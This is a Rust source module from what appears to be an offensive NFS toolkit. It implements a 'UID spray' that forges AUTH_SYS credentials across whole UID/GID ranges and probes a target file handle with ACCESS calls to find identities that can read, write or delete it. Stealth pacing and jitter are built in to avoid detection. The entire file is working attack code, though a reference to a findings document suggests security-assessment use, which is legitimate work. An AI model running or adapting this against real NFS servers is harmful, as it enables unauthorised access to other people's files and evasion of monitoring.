//! UID brute-force module.
//!
//! Iterates over UID/GID ranges to discover which identities
//! have access to specific files or directories.

// Toolkit API  --  not all items are used in currently-implemented phases.
use std::sync::Arc;
use std::time::Duration;

use nfs3_types::nfs3::ACCESS3args;
use tracing::{debug, warn};

use crate::proto::circuit::CircuitBreaker;
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::util::stealth::StealthConfig;

/// NFS ACCESS procedure bits (RFC 1813 S3.3.4)  --  re-exported from the
/// canonical location in `proto::nfs3::types::access`.
///
/// Re-exported here so callers that work with `UidSprayer` don't need to
/// import from the protocol layer directly.
pub use crate::proto::nfs3::types::access as access_bits;

/// Result of a UID spray attempt.
#[derive(Debug, Clone)]
pub struct SprayResult {
    /// UID that was tested.
    pub uid: u32,
    /// GID that was tested.
    pub gid: u32,
    /// Raw ACCESS bits returned by the server (bitmask of access_bits::*).
    /// Callers filter this to find the access types they care about.
    pub access: u32,
}

impl SprayResult {
    /// True if the server granted READ access.
    #[must_use]
    pub const fn can_read(&self) -> bool {
        self.access & access_bits::READ != 0
    }

    /// True if the server granted LOOKUP (directory list) access.
    #[must_use]
    pub const fn can_lookup(&self) -> bool {
        self.access & access_bits::LOOKUP != 0
    }

    /// True if the server granted MODIFY (write/setattr) access.
    #[must_use]
    pub const fn can_modify(&self) -> bool {
        self.access & access_bits::MODIFY != 0
    }

    /// True if the server granted EXTEND (append/create) access.
    #[must_use]
    pub const fn can_extend(&self) -> bool {
        self.access & access_bits::EXTEND != 0
    }

    /// True if the server granted DELETE access.
    #[must_use]
    pub const fn can_delete(&self) -> bool {
        self.access & access_bits::DELETE != 0
    }

    /// True if the server granted EXECUTE access.
    #[must_use]
    pub const fn can_execute(&self) -> bool {
        self.access & access_bits::EXECUTE != 0
    }

    /// Check whether a specific set of required access bits are all granted.
    #[must_use]
    pub const fn has_access(&self, required: u32) -> bool {
        self.access & required == required
    }
}

/// Configuration for UID spraying.
#[derive(Debug)]
pub struct SprayConfig {
    /// Inclusive UID range to iterate.
    pub uid_range: std::ops::RangeInclusive<u32>,
    /// Inclusive GID range to iterate.
    pub gid_range: std::ops::RangeInclusive<u32>,
    /// Auxiliary GIDs to permute per UID attempt (injected into AUTH_SYS).
    pub auxiliary_gids: Vec<u32>,
    /// Remote path string (informational, used in log output).
    pub target_path: String,
    /// Unused in the current sequential implementation; reserved for future
    /// parallel spray support.
    pub concurrency: usize,
    /// Which access bits to test for (bitmask). Default: ALL.
    /// The server always returns the full bitmask, but this controls
    /// which results are considered "hits" for filtering/reporting.
    pub required_access: u32,
    /// Per-credential delay between attempts in ms (independent of global jitter).
    pub per_attempt_delay_ms: u64,
}

/// UID/GID spray engine  --  iterates credential space to find NFS access.
///
/// Implements F-2.1 (UID forgery) from FINDINGS.md. Each attempt is a fresh
/// AUTH_SYS credential with a new stamp (RFC 1057 S9.2) to avoid caching.
pub struct UidSprayer {
    nfs3: Nfs3Client,
    circuit: Arc<CircuitBreaker>,
    stealth: StealthConfig,
}

impl std::fmt::Debug for UidSprayer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("UidSprayer").finish_non_exhaustive()
    }
}

impl UidSprayer {
    /// Create a new sprayer backed by the given NFSv3 client.
    #[must_use]
    pub const fn new(nfs3: Nfs3Client, circuit: Arc<CircuitBreaker>, stealth: StealthConfig) -> Self {
        Self { nfs3, circuit, stealth }
    }

    /// Run the spray against `fh` using the given config.
    ///
    /// Returns all (uid, gid) pairs where the server granted any of the
    /// `required_access` bits. Permission denials are expected and NOT
    /// surfaced as warnings -- they don't trip the circuit breaker.
    ///
    /// All ACCESS calls are sent over a single NFS TCP session by swapping
    /// the AUTH_SYS credential per-call (RFC 1057 S9.2).  This avoids
    /// creating one connection per (uid, gid) pair, which would exhaust the
    /// privileged source-port range (300-1023) after a few hundred attempts.
    pub async fn spray(&self, config: &SprayConfig, fh: &FileHandle) -> Vec<SprayResult> {
        let mut results = Vec::new();
        let nfs_fh = fh.to_nfs_fh3();
        let args = ACCESS3args { object: nfs_fh, access: access_bits::ALL };

        // Check out a single connection for the entire spray.  All credential
        // changes are applied inline; no additional MOUNT calls are made.
        let mut conn = match self.nfs3.checkout_one().await {
            Ok(c) => c,
            Err(e) => {
                warn!(err = %e, "spray: failed to check out connection");
                return results;
            },
        };

        'outer: for uid in config.uid_range.clone() {
            for gid in config.gid_range.clone() {
                // Check circuit breaker before every attempt.
                if let Err(e) = self.check_circuit() {
                    warn!(?e, "circuit breaker open, stopping spray");
                    break 'outer;
                }

                if config.per_attempt_delay_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(config.per_attempt_delay_ms)).await;
                }
                self.stealth.wait().await;

                let mut aux = config.auxiliary_gids.clone();
                if !aux.contains(&gid) {
                    aux.insert(0, gid);
                }

                match conn.access_as(&args, uid, gid, &aux, "nfswolf").await {
                    Ok(res) => match res {
                        nfs3_types::nfs3::Nfs3Result::Ok(ok) => {
                            let granted = ok.access;
                            debug!(uid, gid, access = granted, "spray: access granted");
                            if granted & config.required_access != 0 {
                                results.push(SprayResult { uid, gid, access: granted });
                            }
                        },
                        nfs3_types::nfs3::Nfs3Result::Err((stat, _)) => {
                            debug!(uid, gid, ?stat, "spray: access denied");
                        },
                    },
                    Err(e) => {
                        warn!(uid, gid, err = %e, "spray: RPC error");
                        // Poison the connection so the pool discards it on return.
                        conn.poison();
                        break 'outer;
                    },
                }
            }
        }

        results
    }

    /// Check the circuit breaker using the real server address from the client.
    fn check_circuit(&self) -> anyhow::Result<()> {
        self.circuit.check_or_wait(self.nfs3.host())
    }
}
